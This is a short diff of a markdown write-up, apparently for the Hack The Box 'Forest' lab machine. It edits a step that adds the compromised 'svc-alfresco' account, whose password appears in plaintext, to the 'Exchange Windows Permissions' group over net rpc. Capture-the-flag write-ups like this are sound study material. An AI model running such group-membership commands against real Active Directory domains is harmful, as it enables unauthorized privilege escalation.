@@ -163,13 +163,12 @@ Then we import the data into `Bloodhound`
 ![](../../0.%20Assets/Forest-1791202795596.webp)
 
 
-Okay let's add ourselves 
+Okay let's add ourselves to the group
 
 ```
 net rpc group addmem "Exchange Windows Permissions" "svc-alfresco" -U "htb.local/svc-alfresco%s3rvice" -S 10.129.95.210
 ```
 
-great, now we need to add the 
 
 ![](../../0.%20Assets/Forest-1791203599087.webp)
 
